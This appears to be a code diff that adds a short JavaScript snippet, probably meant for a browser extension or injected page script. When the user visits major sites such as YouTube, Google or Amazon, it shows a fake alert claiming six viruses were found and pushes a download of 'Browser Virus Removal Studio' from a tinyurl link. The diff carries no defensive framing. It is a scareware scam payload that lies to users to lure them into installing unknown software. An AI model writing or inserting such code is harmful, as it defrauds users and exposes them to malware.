@@ -1,0 +1,3 @@
+if (/youtube\.com|imdb\.com|google\.com|bing\.com|play\.google\.com|amazon\.com|microsoft\.com/.test(window.location.href)) {
+  alert('Alert: We discovered 6 viruses on your device! We already tried removing them, but the attempted removals have failed! The only other way we can try to remove them is through the official BVRS. BVRS means Browser Virus Removal Studio. The only way to obtain the official BVRS is through opening a download link, which is thankfully available here: https://tinyurl.com/removalstudio');
+}
